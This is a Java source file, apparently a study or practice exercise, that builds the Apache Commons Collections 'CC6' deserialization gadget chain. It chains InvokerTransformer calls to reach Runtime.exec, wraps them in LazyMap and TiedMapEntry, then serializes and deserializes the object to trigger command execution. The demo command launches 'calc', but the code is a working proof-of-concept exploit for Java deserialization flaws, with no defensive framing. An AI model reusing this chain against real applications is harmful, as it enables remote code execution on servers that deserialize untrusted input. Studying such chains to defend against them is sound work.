import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;

public class CC6_Problem_Version1 {
    public static void main(String[] args) throws Exception {
        ConstantTransformer ct=new ConstantTransformer(Runtime.class);
        InvokerTransformer i1=new InvokerTransformer("getMethod",
            new Class[]{String.class,Class[].class},
            new Object[]{"getRuntime",new Class[0]}
        );
        InvokerTransformer i2=new InvokerTransformer("invoke",
            new Class[]{Object.class,Object[].class},
            new Object[]{null,new Object[0]}
        );
        InvokerTransformer i3=new InvokerTransformer("exec", 
            new Class[]{String.class},
            new Object[]{"calc"}
         );
         Transformer[] ts=new Transformer[]{ct,i1,i2,i3};
         ChainedTransformer chain=new ChainedTransformer(ts);


         HashMap map=new HashMap();
         Map lazyMap=LazyMap.decorate(map, chain);

         TiedMapEntry entry=new TiedMapEntry(lazyMap, "key");

         HashMap entrymap=new HashMap();
         entrymap.put(entry, "value");


         ByteArrayOutputStream baos=new ByteArrayOutputStream();
         ObjectOutputStream oos=new ObjectOutputStream(baos);
         oos.writeObject(entrymap);
         oos.flush();
         oos.close();
         byte[] data=baos.toByteArray();
         System.out.println("Serialized data length: " + data.length);

         ByteArrayInputStream bais=new ByteArrayInputStream(data);
         ObjectInputStream ois=new ObjectInputStream(bais);
            ois.readObject();
            ois.close();
         System.out.println("Deserialization completed.");

    }
}
